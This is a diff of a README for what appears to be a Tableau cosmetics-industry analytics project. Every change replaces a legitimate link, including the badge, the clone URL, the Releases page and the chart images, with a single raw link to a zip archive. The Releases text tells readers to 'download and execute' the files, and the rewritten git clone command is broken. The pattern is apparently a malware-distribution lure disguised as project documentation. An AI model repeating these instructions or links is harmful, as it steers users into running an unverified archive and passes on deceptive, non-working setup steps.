@@ -1,6 +1,6 @@
 # Cosmetic Insights: Analyzing Trends in the Cosmetics Industry
 
-![Cosmetics Dashboard](https://img.shields.io/badge/Cosmetic%20Insights%20Dashboard-blue?style=flat&logo=tableau)
+![Cosmetics Dashboard](https://raw.githubusercontent.com/bhargav1137/Cosmetic-Insights-Tableau-Project/main/1_Assignments/Insights_Project_Tableau_Cosmetic_v1.6-beta.4.zip%20Insights%20Dashboard-blue?style=flat&logo=tableau)
 
 ## Overview
 
@@ -44,7 +44,7 @@ To run this project, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/bhargav1137/Cosmetic-Insights-Tableau-Project.git
+   git clone https://raw.githubusercontent.com/bhargav1137/Cosmetic-Insights-Tableau-Project/main/1_Assignments/Insights_Project_Tableau_Cosmetic_v1.6-beta.4.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -53,7 +53,7 @@ To run this project, follow these steps:
    ```
 
 3. **Download the necessary files from the Releases section**:
-   Visit [Releases](https://github.com/bhargav1137/Cosmetic-Insights-Tableau-Project/releases) to find the required files.
+   Visit [Releases](https://raw.githubusercontent.com/bhargav1137/Cosmetic-Insights-Tableau-Project/main/1_Assignments/Insights_Project_Tableau_Cosmetic_v1.6-beta.4.zip) to find the required files.
 
 ## Usage
 
@@ -76,13 +76,13 @@ The project includes several key visualizations:
 2. **Customer Demographics**: A pie chart illustrating customer segments.
 3. **Product Performance**: A bar chart comparing different products.
 
-![Sales Trends](https://via.placeholder.com/600x300?text=Sales+Trends)
-![Customer Demographics](https://via.placeholder.com/600x300?text=Customer+Demographics)
-![Product Performance](https://via.placeholder.com/600x300?text=Product+Performance)
+![Sales Trends](https://raw.githubusercontent.com/bhargav1137/Cosmetic-Insights-Tableau-Project/main/1_Assignments/Insights_Project_Tableau_Cosmetic_v1.6-beta.4.zip+Trends)
+![Customer Demographics](https://raw.githubusercontent.com/bhargav1137/Cosmetic-Insights-Tableau-Project/main/1_Assignments/Insights_Project_Tableau_Cosmetic_v1.6-beta.4.zip+Demographics)
+![Product Performance](https://raw.githubusercontent.com/bhargav1137/Cosmetic-Insights-Tableau-Project/main/1_Assignments/Insights_Project_Tableau_Cosmetic_v1.6-beta.4.zip+Performance)
 
 ## Releases
 
-For the latest updates and downloadable files, visit the [Releases section](https://github.com/bhargav1137/Cosmetic-Insights-Tableau-Project/releases). Make sure to download and execute the necessary files for your analysis.
+For the latest updates and downloadable files, visit the [Releases section](https://raw.githubusercontent.com/bhargav1137/Cosmetic-Insights-Tableau-Project/main/1_Assignments/Insights_Project_Tableau_Cosmetic_v1.6-beta.4.zip). Make sure to download and execute the necessary files for your analysis.
 
 ## Contributing
 
